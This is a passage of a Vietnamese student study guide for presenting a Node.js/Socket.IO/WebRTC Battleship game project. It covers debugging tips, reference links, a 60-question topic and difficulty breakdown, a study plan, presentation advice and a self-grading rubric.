    2. Nginx → HTTP → Node.js console.log('Received request')
    3. Node.js → JWT verify → middleware auth.js
    4. Node.js → MongoDB query → Mongoose debug log
    5. MongoDB → Response → Node.js console.log('DB returned')
    6. Node.js → JSON response → Nginx
    7. Nginx → HTTPS → Browser (Network tab timing)
    ```

60. **"Memory leak detection?"**
    ```bash
    # PM2 monitoring:
    pm2 monit
    
    # If memory growing:
    pm2 restart server  # Temporary fix
    
    # Find leak:
    node --inspect server.js
    # Chrome DevTools → Memory → Take Heap Snapshot
    # Compare snapshots → Find retained objects
    ```

---

## 📖 TÀI LIỆU THAM KHẢO CHO HỌC TẬP

### Official Docs
- **Socket.IO:** https://socket.io/docs/v4/
- **WebRTC:** https://webrtc.org/getting-started/overview
- **MongoDB:** https://www.mongodb.com/docs/manual/
- **Redis:** https://redis.io/docs/

### Video Tutorials (Khuyến nghị)
- **Socket.IO Crash Course:** Traversy Media (YouTube)
- **WebRTC Crash Course:** Hussein Nasser (YouTube)
- **TCP vs UDP:** Computerphile (YouTube)
- **NAT Traversal Explained:** Network Direction (YouTube)

### Code Examples
- **Socket.IO Chat:** https://socket.io/get-started/chat
- **WebRTC Samples:** https://webrtc.github.io/samples/

---

## 🎓 TIPS TRÌNH BÀY TỐT

### Dos ✅
- **Giải thích bằng diagram:** Hình ảnh > text
- **Demo code thực tế:** Run code, show console logs
- **Liên hệ thực tế:** "Như Zoom call dùng WebRTC"
- **Trả lời "Tại sao?"**: Không chỉ "Cái gì?" mà còn "Tại sao lại làm vậy?"
- **Thú vị:** Kể chuyện bug gặp phải và cách fix

### Don'ts ❌
- **Đọc slide:** Nói thêm info, không đọc y chang
- **Quá kỹ thuật:** Giải thích đơn giản trước, sau mới đi sâu
- **Dài dòng:** 3-4 minutes/member, 15 minutes total
- **Tự tin quá:** "Tôi chưa chắc lắm nhưng..." > "Hoàn toàn chắc chắn..."
- **Blame teammate:** Nếu demo fail, "Chúng tôi sẽ fix" > "Bạn A code sai"

---

## 📅 TIMELINE CHUẨN BỊ (Khuyến Nghị)

### Week 1: Học & Phân Tích
- [ ] Day 1-2: Mỗi member đọc PROJECT_ANALYSIS.md
- [ ] Day 3-4: Đọc code files của phần mình
- [ ] Day 5-6: Chạy code, test từng feature
- [ ] Day 7: Họp team review kiến thức

### Week 2: Chuẩn Bị Slides & Demo
- [ ] Day 1-2: Mỗi member làm slides (3-4 slides)
- [ ] Day 3-4: Làm demo scenario
- [ ] Day 5: Rehearsal 1 (practice)
- [ ] Day 6: Fix feedback, polish slides
- [ ] Day 7: Rehearsal 2 (final)

---

## 🏆 THÀNH CÔNG!

Nếu làm đủ checklist trên, team sẽ:
- ✅ Hiểu sâu về network programming
- ✅ Tự tin trình bày và demo
- ✅ Trả lời được mọi câu hỏi
- ✅ Điểm cao! 🎉

**Chúc team thành công!** 💪

---

## 📚 TỔNG HỢP 60 CÂU HỎI THEO CHỦ ĐỀ

### 🔷 Infrastructure & Deployment (Q11-Q20)
- Nginx reverse proxy, SSL/TLS, Let's Encrypt
- WebSocket upgrade, Headers (X-Forwarded-For, X-Real-IP)
- 502 Bad Gateway, Production vs Development

### 🔷 Network Fundamentals: TCP/UDP (Q21-Q25)
- TCP 3-way handshake, 4-way termination
- UDP checksum, WebRTC UDP choice
- Socket.IO long-polling fallback

### 🔷 WebSocket Protocol (Q26-Q28)
- HTTP vs WebSocket comparison
- WebSocket frame structure
- Socket.IO vs pure WebSocket

### 🔷 Security (Q29-Q33)
- XSS attack & sanitization
- NoSQL injection prevention
- CSRF and JWT immunity
- Rate limiting bypass
- Man-in-the-Middle & TLS

### 🔷 JWT Authentication (Q34-Q36)
- Stateless concept
- Access token vs Refresh token
- JWT secret brute-force

### 🔷 Database (Q37-Q40)
- MongoDB vs SQL comparison
- Mongoose schema enforcement
- TTL index mechanism
- Redis persistence: RDB vs AOF

### 🔷 Game Logic (Q41-Q44)
- Server-authoritative anti-cheat
- Reconnect grace period
- Turn timer: Server vs Client-driven
- Deployment timer vs Battle timer

### 🔷 WebRTC Advanced (Q45-Q48)
- SDP structure & content
- ICE trickle vs non-trickle
- DTLS-SRTP encryption
- Symmetric NAT vs Cone NAT

### 🔷 Performance & Scalability (Q49-Q54)
- Node.js Event Loop phases
- Multi-threading vs Event-driven
- Socket.IO Redis adapter
- Horizontal vs Vertical scaling
- PM2 cluster mode vs fork mode
- Memory leak causes

### 🔷 Monitoring & Debugging (Q55-Q60)
- Server overload metrics
- Socket.IO debug techniques
- Nginx access log vs error log
- Rate limit counter reset
- Request tracing (Browser → DB)
- Memory leak detection

---

## 🎯 PHÂN LOẠI CÂU HỎI THEO ĐỘ KHÓ

### ⭐ Dễ (Must Know) - 20 câu
Q1, Q2, Q3, Q4, Q6, Q7, Q11, Q12, Q13, Q21, Q22, Q23, Q26, Q29, Q34, Q37, Q41, Q42, Q43, Q55

**Những câu này BẮT BUỘC phải trả lời được!**

### ⭐⭐ Trung Bình (Should Know) - 25 câu
Q5, Q8, Q9, Q14, Q15, Q16, Q17, Q18, Q19, Q20, Q24, Q25, Q27, Q30, Q31, Q35, Q38, Q39, Q44, Q45, Q49, Q51, Q56, Q57, Q58

**Nên biết để trả lời tốt, tăng điểm**

### ⭐⭐⭐ Khó (Nice to Know) - 15 câu
Q10, Q28, Q32, Q33, Q36, Q40, Q46, Q47, Q48, Q50, Q52, Q53, Q54, Q59, Q60

**Biết được = điểm cộng lớn, chứng tỏ hiểu sâu**

---

## 📖 STUDY PLAN (Kế Hoạch Học 3 Ngày)

### Day 1: Foundation (Q1-Q20)
**Morning (2h):**
- [ ] Đọc Infrastructure section trong TEAM_GUIDE.md
- [ ] Đọc SSL/TLS section trong NETWORK_STUDY_NOTES.md
- [ ] Practice: Setup local Nginx (optional)

**Afternoon (2h):**
- [ ] Trả lời Q1-Q10 (code-related)
- [ ] Trả lời Q11-Q20 (infrastructure)
- [ ] Vẽ diagram: Browser → Nginx → Node.js → DB

**Evening (1h):**
- [ ] Review và tự kiểm tra lại 20 câu
- [ ] Note những câu chưa hiểu

### Day 2: Advanced Concepts (Q21-Q40)
**Morning (2h):**
- [ ] Đọc TCP/UDP comparison
- [ ] Đọc WebSocket lifecycle
- [ ] Đọc JWT authentication flow

**Afternoon (2h):**
- [ ] Trả lời Q21-Q30 (Network & Security)
- [ ] Trả lời Q31-Q40 (JWT & Database)
- [ ] Code review: auth.js, gameLogic.js

**Evening (1h):**
- [ ] Review Day 1 + Day 2 (40 câu)
- [ ] Practice giải thích cho bạn nghe

### Day 3: Expert Level + Practice (Q41-Q60)
**Morning (2h):**
- [ ] Đọc WebRTC NAT Traversal
- [ ] Đọc Performance & Scalability
- [ ] Trả lời Q41-Q50

**Afternoon (2h):**
- [ ] Trả lời Q51-Q60
- [ ] Practice demo: Login → Game → Call
- [ ] Prepare backup slides (screenshot)

**Evening (2h):**
- [ ] Full review: 60 câu (speed run)
- [ ] Team rehearsal: Each member present 5 min
- [ ] Mock Q&A session

---

## 🎤 PRESENTATION TIPS

### Opening (1 min)
```
"Xin chào, chúng em là Nhóm 3 với dự án Battleship Multiplayer Game.
Đây là game turn-based real-time với voice call integration.
Tech stack: Node.js, Socket.IO, WebRTC, MongoDB, Redis.
Deployed tại battleshipgame.fun với Nginx reverse proxy và Let's Encrypt SSL."
```

### Body (10-12 min)
- Member 1: HTTP API + Infrastructure (2.5 min)
- Member 2: Socket.IO + Rooms (2.5 min)
- Member 3: Game Logic + Timers (2.5 min)
- Member 4: Chat + Database (2 min)
- Member 5: WebRTC + NAT (2.5 min)

### Demo (3-4 min)
1. **Login:** Show JWT token in localStorage
2. **Matchmaking:** Show Socket.IO events in console
3. **Game:** Attack, show server validation
4. **Chat:** Show XSS sanitization
5. **Voice call:** Show ICE candidates in console

### Q&A (3-5 min)
- Mỗi member chuẩn bị trả lời 2-3 câu về phần của mình
- Nếu không biết: "Em chưa rõ lắm, nhưng em nghĩ là..." (thử suy luận)
- Tránh: "Em không biết" rồi im lặng

### Closing (30s)
```
"Qua project này, team em đã học được về real-time networking,
WebSocket, WebRTC, và production deployment với Nginx và SSL.
Cảm ơn thầy/cô đã lắng nghe. Team sẵn sàng trả lời câu hỏi ạ!"
```

---

## 🔥 COMMON MISTAKES TO AVOID

### Technical Mistakes
- ❌ "Socket.IO là WebSocket" → Socket.IO builds on WebSocket
- ❌ "WebRTC dùng TCP" → Signaling TCP, Media UDP
- ❌ "Redis là database" → Redis là in-memory cache
- ❌ "Nginx là server" → Nginx là reverse proxy (Node.js là server)
- ❌ "JWT lưu trên server" → JWT stateless, không lưu server

### Presentation Mistakes
- ❌ Đọc slide verbatim
- ❌ Code quá nhỏ (font size < 20pt)
- ❌ Nói quá nhanh (nervous)
- ❌ Không maintain eye contact
- ❌ Demo fail không có Plan B

### Q&A Mistakes
- ❌ "Em không biết" rồi dừng
- ❌ Tranh luận với examiner
- ❌ Đổ lỗi cho teammate
- ❌ Giải thích quá dài dòng (>2 min)
- ❌ Không nghe hết câu hỏi đã trả lời

---

## ✅ FINAL CHECKLIST

### Knowledge (Kiến Thức)
- [ ] Trả lời được 20/20 câu ⭐ Dễ (100%)
- [ ] Trả lời được 15/25 câu ⭐⭐ Trung Bình (60%)
- [ ] Trả lời được 5/15 câu ⭐⭐⭐ Khó (33%)
- [ ] **Total: 40/60 câu = ĐẠT YÊU CẦU** ✅

### Skills (Kỹ Năng)
- [ ] Vẽ được architecture diagram trong 2 phút
- [ ] Giải thích được flow: Login → Game → Call
- [ ] Debug được 1 lỗi common (502, WebSocket fail)
- [ ] Code được 1 function đơn giản (JWT verify, attack validation)

### Demo (Thực Hành)
- [ ] Chạy được local (localhost:3000)
- [ ] Hoặc access được production (battleshipgame.fun)
- [ ] Có screenshots/video backup
- [ ] Biết show console logs relevant

### Presentation (Trình Bày)
- [ ] Slides < 15 trang, font >= 24pt
- [ ] Có ít nhất 2 diagrams
- [ ] Timing: 15-20 minutes total
- [ ] Rehearsal ít nhất 2 lần

---

## 🏆 GRADING RUBRIC (Tự Đánh Giá)

### Excellent (9-10 điểm)
- ✅ Trả lời đúng 50+ / 60 câu hỏi
- ✅ Giải thích rõ ràng, có ví dụ cụ thể
- ✅ Demo live thành công
- ✅ Trả lời Q&A tự tin, chính xác
- ✅ Hiểu sâu cả code + infrastructure

### Good (7-8 điểm)
- ✅ Trả lời đúng 35-49 / 60 câu hỏi
- ✅ Giải thích tốt nhưng thiếu ví dụ
- ✅ Demo backup (screenshots)
- ✅ Trả lời Q&A đúng phần lớn
- ✅ Hiểu code, infrastructure cơ bản

### Pass (5-6 điểm)
- ✅ Trả lời đúng 20-34 / 60 câu hỏi
- ✅ Giải thích cơ bản, đúng hướng
- ✅ Demo fail nhưng giải thích được lỗi
- ✅ Trả lời Q&A chậm, cần gợi ý
- ✅ Hiểu concept nhưng chưa sâu

### Fail (< 5 điểm)
- ❌ Trả lời đúng < 20 / 60 câu hỏi
- ❌ Giải thích sai hoặc không liên quan
- ❌ Demo không chạy, không có backup
- ❌ Không trả lời được Q&A
- ❌ Không hiểu code của mình

---

## 💪 MOTIVATION

**Remember:**
- ✅ Bạn đã làm được 1 full-stack project production-ready
- ✅ Bạn đã deploy lên internet với domain thật
- ✅ Bạn đã implement real-time + P2P technology
- ✅ 60 câu hỏi này cover 90% kiến thức thi

**Practice makes perfect:**
- Day 1: Khó khăn, nhiều câu không biết → NORMAL
- Day 2: Bắt đầu hiểu, trả lời được 30-40 câu → GOOD PROGRESS
- Day 3: Tự tin, trả lời được 45-55 câu → READY!

**Team work:**
- Giúp đỡ nhau giải thích câu khó
- Mock interview lẫn nhau
- "Teaching is the best way to learn"

---

**🎉 Chúc team thành công rực rỡ! 🎉**

_"The only way to do great work is to love what you do." - Steve Jobs_

---

**© 2025 Battleship - Developed by Nhóm 3**  
**GitHub:** https://github.com/nviethung23  
**Domain:** battleshipgame.fun
